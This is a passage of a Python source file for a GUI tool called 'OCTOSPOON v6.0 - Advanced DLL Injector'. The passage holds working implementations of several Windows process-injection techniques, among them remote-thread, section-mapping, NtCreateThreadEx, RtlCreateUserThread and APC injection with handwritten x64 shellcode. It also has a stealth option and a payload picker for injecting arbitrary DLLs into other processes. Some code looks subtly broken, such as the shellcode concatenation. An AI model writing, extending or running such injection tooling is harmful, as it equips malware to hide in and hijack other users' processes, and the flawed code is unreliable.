        process = psutil.Process(self.pid)
        target_thread_id = process.threads()[0].id if process.threads() else 0
        
        if not target_thread_id:
            raise Exception("No threads in target process")
        
        # Load DLL to get module handle
        h_module = kernel32.LoadLibraryW(dll_path)
        if not h_module:
            raise Exception("Failed to load DLL")
        
        # Set Windows Hook
        hook = user32.SetWindowsHookExW(
            2,  # WH_GETMESSAGE
            None,  # Will be set by hook
            h_module,
            target_thread_id
        )
        
        if hook:
            self.log("Hook set successfully")
            # Post message to trigger hook
            user32.PostThreadMessageW(target_thread_id, 0, 0, 0)
            time.sleep(1)
            user32.UnhookWindowsHookEx(hook)
        else:
            raise Exception("Failed to set hook")
        
        kernel32.FreeLibrary(h_module)

    # === 12. PowerLoaderEx Injection (NEW) ===
    def powerloader_injection(self):
        self.log("Starting PowerLoaderEx Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        if not h_process:
            raise Exception(f"Failed to open process {self.pid}")
        
        # Create shared memory section
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        section_name = "Global\\PowerLoader" + str(os.getpid())
        
        # Create file mapping
        h_mapping = kernel32.CreateFileMappingW(
            INVALID_HANDLE_VALUE,
            None,
            PAGE_READWRITE,
            0,
            len(dll_path_bytes),
            section_name
        )
        
        if not h_mapping:
            kernel32.CloseHandle(h_process)
            raise Exception("Failed to create file mapping")
        
        # Map view and write DLL path
        map_view = kernel32.MapViewOfFile(h_mapping, FILE_MAP_WRITE, 0, 0, len(dll_path_bytes))
        if map_view:
            ctypes.memmove(map_view, dll_path_bytes, len(dll_path_bytes))
            kernel32.UnmapViewOfFile(map_view)
        
        # Create remote thread with shared memory
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        remote_section = kernel32.OpenFileMappingW(FILE_MAP_READ, False, section_name)
        remote_view = kernel32.MapViewOfFile(remote_section, FILE_MAP_READ, 0, 0, len(dll_path_bytes))
        
        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, loadlib, remote_view, 0, byref(thread_id))
        
        if h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log("PowerLoader injection completed")
        else:
            raise Exception("Failed to create remote thread")
        
        kernel32.CloseHandle(h_mapping)
        kernel32.CloseHandle(h_process)

    # === 13. Section Mapping Injection (NEW) ===
    def section_mapping_injection(self):
        self.log("Starting Section Mapping Injection...")
        
        with open(self.dll_path, 'rb') as f:
            dll_data = f.read()
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        # Create executable heap in local process
        executable_heap = kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(dll_data), 0)
        local_mem = kernel32.HeapAlloc(executable_heap, HEAP_ZERO_MEMORY, len(dll_data))
        
        if local_mem:
            ctypes.memmove(local_mem, dll_data, len(dll_data))
        
        # Map into remote process
        section_handle = wintypes.HANDLE(0)
        max_size = wintypes.LARGE_INTEGER(len(dll_data))
        
        status = ntdll.NtCreateSection(byref(section_handle), SECTION_ALL_ACCESS, None, byref(max_size), PAGE_EXECUTE_READWRITE, 0x8000000, None)
        
        remote_base = c_void_p(0)
        view_size = ctypes.c_size_t(len(dll_data))
        ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
        
        # Copy data
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_data, len(dll_data), byref(bytes_written))
        
        # Execute via NtCreateThreadEx
        h_thread = wintypes.HANDLE(0)
        e_lfanew = struct.unpack_from("<I", dll_data, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", dll_data, e_lfanew + 0x28)[0]
        remote_entry = remote_base.value + entry_rva
        
        ntdll.NtCreateThreadEx(byref(h_thread), THREAD_ALL_ACCESS, None, h_process, remote_entry, None, 0, 0, 0, 0, None)
        
        kernel32.WaitForSingleObject(h_thread, INFINITE)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(section_handle)
        kernel32.CloseHandle(h_process)
        
        self.log("Section mapping injection completed")

    # === 14. NtCreateThreadEx Injection (NEW) ===
    def ntcreatethread_injection(self):
        self.log("Starting NtCreateThreadEx Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        h_thread = wintypes.HANDLE(0)
        client_id = CLIENT_ID()
        
        status = ntdll.NtCreateThreadEx(
            byref(h_thread),
            THREAD_ALL_ACCESS,
            None,
            h_process,
            loadlib,
            remote_mem,
            0,  # CreateSuspended = FALSE
            0, 0, 0, 0,
            None
        )
        
        if status == 0 and h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log("NtCreateThreadEx injection completed")
        else:
            raise Exception(f"NtCreateThreadEx failed: 0x{status:X}")
        
        kernel32.CloseHandle(h_process)

    # === 15. RtlCreateUserThread Injection (NEW) ===
    def rtlcreateuserthread_injection(self):
        self.log("Starting RtlCreateUserThread Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        h_thread = wintypes.HANDLE(0)
        client_id = CLIENT_ID()
        
        status = ntdll.RtlCreateUserThread(
            h_process,
            None,
            False,  # CreateSuspended = FALSE
            0,
            None,
            None,
            loadlib,
            remote_mem,
            byref(h_thread),
            byref(client_id)
        )
        
        if status == 0 and h_thread:
            kernel32.WaitForSingleObject(h_thread, INFINITE)
            kernel32.CloseHandle(h_thread)
            self.log(f"RtlCreateUserThread injection completed (TID: {client_id.UniqueThread})")
        else:
            raise Exception(f"RtlCreateUserThread failed: 0x{status:X}")
        
        kernel32.CloseHandle(h_process)

    # === 16. QueueUserAPC + NtTestAlert Injection (NEW) ===
    def ntalert_injection(self):
        self.log("Starting NtTestAlert Injection...")
        
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
        
        dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        bytes_written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), byref(bytes_written))
        
        loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
        
        # Create shellcode that calls NtTestAlert after LoadLibrary
        nt_test_alert = kernel32.GetProcAddress(ntdll._handle, b"NtTestAlert")
        
        shellcode = (
            b"\x48\x83\xEC\x28"
            b"\x48\xB9" + struct.pack("<Q", remote_mem)
            b"\x48\xB8" + struct.pack("<Q", loadlib)
            b"\xFF\xD0"
            b"\x48\xB8" + struct.pack("<Q", nt_test_alert)
            b"\xFF\xD0"
            b"\x48\x83\xC4\x28"
            b"\xC3"
        )
        
        remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
        
        # Queue APC to main thread
        queued = 0
        process = psutil.Process(self.pid)
        for thread in process.threads():
            h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, thread.id)
            if h_thread:
                if kernel32.QueueUserAPC(remote_shellcode, h_thread, 0):
                    queued += 1
                kernel32.CloseHandle(h_thread)
                if queued > 0:
                    break
        
        kernel32.CloseHandle(h_process)
        self.log(f"NtTestAlert APCs queued: {queued}")


# === Enhanced GUI ===
class OctoSpoonGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("OCTOSPOON v6.0 - Advanced DLL Injector")
        self.setGeometry(100, 100, 1000, 700)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a1a; }
            QLabel { color: #e0e0e0; font-family: 'Consolas', 'Courier New', monospace; }
            QComboBox { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #555; padding: 5px; }
            QPushButton { background-color: #3d3d3d; color: #e0e0e0; border: 1px solid #555; padding: 8px; }
            QPushButton:hover { background-color: #4d4d4d; }
            QListWidget { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #555; }
            QTextEdit { background-color: #0d0d0d; color: #00ff41; border: 1px solid #555; font-size: 12px; }
            QProgressBar { background-color: #2d2d2d; border: 1px solid #555; }
            QCheckBox { color: #e0e0e0; }
        """)
        self.init_ui()

    def init_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(10)
        layout.setContentsMargins(15, 15, 15, 15)

        # Title
        title = QLabel("OCTOSPOON v6.0 - Advanced DLL Injector")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setFont(QFont("Consolas", 18, QFont.Weight.Bold))
        title.setStyleSheet("color: #00ff41; margin: 10px;")
        layout.addWidget(title)
        
        subtitle = QLabel("16 Advanced Injection Techniques | x64 Architecture")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setFont(QFont("Consolas", 11))
        subtitle.setStyleSheet("color: #888; margin-bottom: 10px;")
        layout.addWidget(subtitle)

        splitter = QSplitter()
        layout.addWidget(splitter)

        # Left Panel
        left = QWidget()
        left_layout = QVBoxLayout(left)
        left_layout.setSpacing(10)

        # Method Selection
        method_label = QLabel("⚙️  Injection Method:")
        method_label.setStyleSheet("font-weight: bold; color: #00ff41;")
        left_layout.addWidget(method_label)
        
        self.method_combo = QComboBox()
        self.method_combo.addItems([
            "Standard", "APC", "Early Bird", "Thread Hijack",
            "Reflective", "Manual Map", "Process Hollowing",
            "Thread Pool", "Kernel Driver", "AtomBombing",
            "SetHook", "PowerLoader", "Section Mapping",
            "NtCreateThread", "RtlCreateUserThread", "NtAlert"
        ])
        self.method_combo.currentIndexChanged.connect(self.on_method_changed)
        left_layout.addWidget(self.method_combo)

        # Stealth Mode
        self.stealth_check = QCheckBox("Stealth Mode (Use CreateRemoteThreadEx)")
        self.stealth_check.setVisible(False)  # Only visible for Standard
        left_layout.addWidget(self.stealth_check)

        # Target Process
        target_label = QLabel("🎯  Target Process:")
        target_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
        left_layout.addWidget(target_label)
        
        t_layout = QHBoxLayout()
        self.pid_list = QListWidget()
        self.pid_list.setMaximumHeight(150)
        self.refresh_btn = QPushButton("🔄 Refresh")
        self.refresh_btn.clicked.connect(self.refresh_pids)
        t_layout.addWidget(self.pid_list)
        t_layout.addWidget(self.refresh_btn)
        left_layout.addLayout(t_layout)

        # Payload
        payload_label = QLabel("💉  Payload:")
        payload_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
        left_layout.addWidget(payload_label)
        
        p_layout = QHBoxLayout()
        self.payload_label = QLabel("No file selected")
        self.payload_label.setStyleSheet("color: #888; border: 1px solid #555; padding: 5px;")
        self.browse_btn = QPushButton("📁 Browse")
        self.browse_btn.clicked.connect(self.browse_payload)
        p_layout.addWidget(self.payload_label)
        p_layout.addWidget(self.browse_btn)
        left_layout.addLayout(p_layout)

        # Progress Bar
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        self.progress.setTextVisible(False)
        left_layout.addWidget(self.progress)

        # Inject Button
        self.inject_btn = QPushButton("🚀 INJECT")
        self.inject_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff41; color: black; font-weight: bold;
                padding: 12px; border-radius: 5px; font-size: 14px; margin-top: 10px;
            }
            QPushButton:hover { background-color: #00cc33; }
            QPushButton:pressed { background-color: #009922; }
            QPushButton:disabled { background-color: #555; color: #888; }
        """)
        self.inject_btn.clicked.connect(self.start_injection)
        left_layout.addWidget(self.inject_btn)

        left_layout.addStretch()
        splitter.addWidget(left)

        # Right Panel - Log
        log_label = QLabel("📋  Console Output:")
        log_label.setStyleSheet("font-weight: bold; color: #00ff41;")
        
        right = QWidget()
        right_layout = QVBoxLayout(right)
        right_layout.addWidget(log_label)
        
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        right_layout.addWidget(self.log_box)
        splitter.addWidget(right)

        splitter.setSizes([350, 650])
        
        # Initial setup
        self.refresh_pids()
        self.log("OCTOSPOON v6.0 initialized - 16 injection methods available")
        self.log("Ready for injection...")
        self.log("⚠️ Run as Administrator for full functionality")

    def log(self, msg):
        self.log_box.append(msg)
        scrollbar = self.log_box.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())

    def on_method_changed(self, index):
        method = self.method_combo.currentText()
        
        # Special handling for different methods
        if method in ["Early Bird", "Process Hollowing"]:
            self.pid_list.setEnabled(False)
            self.log(f"[*] {method} uses CreateProcess - select host EXE when injecting")
        elif method == "Kernel Driver":
            self.pid_list.setEnabled(False)
            self.log("[*] Kernel Driver doesn't require target process")
        elif method == "Standard":
            self.pid_list.setEnabled(True)
            self.stealth_check.setVisible(True)
            return
        else:
            self.pid_list.setEnabled(True)
        
        self.stealth_check.setVisible(False)

    def refresh_pids(self):
        self.pid_list.clear()
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    pid = proc.info['pid']
                    name = proc.info['name']
                    if pid > 4:
                        self.pid_list.addItem(f"[{pid:5d}] {name}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except Exception as e:
            self.log(f"[!] Error refreshing process list: {e}")
        
        self.log(f"[*] Process list refreshed ({self.pid_list.count()} processes)")

    def browse_payload(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Payload", "", 
            "All Files (*.dll *.exe);;DLL Files (*.dll);;Executable Files (*.exe);;All Files (*.*)"
        )
        if path:
            self.payload_label.setText(os.path.basename(path))
            self.payload_label.setToolTip(path)
            self.payload_label.full_path = path
            self.log(f"[*] Payload: {os.path.basename(path)}")

    def start_injection(self):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
            if not is_admin:
                reply = QMessageBox.warning(
                    self, "Warning",
                    "Administrator privileges recommended!\nContinue anyway?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                )
                if reply == QMessageBox.StandardButton.No:
                    return
        except:
            pass
        
        method = self.method_combo.currentText()
        stealth = self.stealth_check.isChecked() if self.stealth_check.isVisible() else False
        
        # Validate inputs
        if method in ["Early Bird", "Process Hollowing"]:
            exe_path, _ = QFileDialog.getOpenFileName(
                self, f"Select Host EXE for {method}", "",
                "Executable Files (*.exe);;All Files (*.*)"
            )
            if not exe_path:
                return
            
            pid = None
            dll_path = getattr(self.payload_label, 'full_path', None)
            if not dll_path:
                QMessageBox.warning(self, "Error", "Please select a payload DLL")
                return
        elif method == "Kernel Driver":
            pid = None
            dll_path = None
            exe_path = None
        else:
            current_item = self.pid_list.currentItem()
            if not current_item:
                QMessageBox.warning(self, "Error", "Select a target process")
                return
            
            try:
                pid_text = current_item.text().split(']')[0][1:].strip()
                pid = int(pid_text)
            except (ValueError, IndexError):
                QMessageBox.warning(self, "Error", "Invalid process selection")
                return
            
            dll_path = getattr(self.payload_label, 'full_path', None)
            if not dll_path:
                QMessageBox.warning(self, "Error", "Please select a payload DLL")
                return
            
            exe_path = None
        
        # Start injection
        self.inject_btn.setEnabled(False)
        self.inject_btn.setText("⏳ Injecting...")
        self.progress.setVisible(True)
        self.progress.setRange(0, 0)
        
        self.thread = InjectorThread(method, pid, dll_path, exe_path, stealth)
        self.thread.log_signal.connect(self.log)
        self.thread.error_signal.connect(lambda msg: self.log(msg))
        self.thread.done_signal.connect(self.injection_done)
        self.thread.start()

    def injection_done(self, msg):
        self.progress.setVisible(False)
        self.progress.setRange(0, 100)
        self.inject_btn.setEnabled(True)
        self.inject_btn.setText("🚀 INJECT")
        self.log(msg)
        self.log("-" * 60)


if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)
        app.setStyle('Fusion')
        window = OctoSpoonGUI()
        window.show()
        sys.exit(app.exec())
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
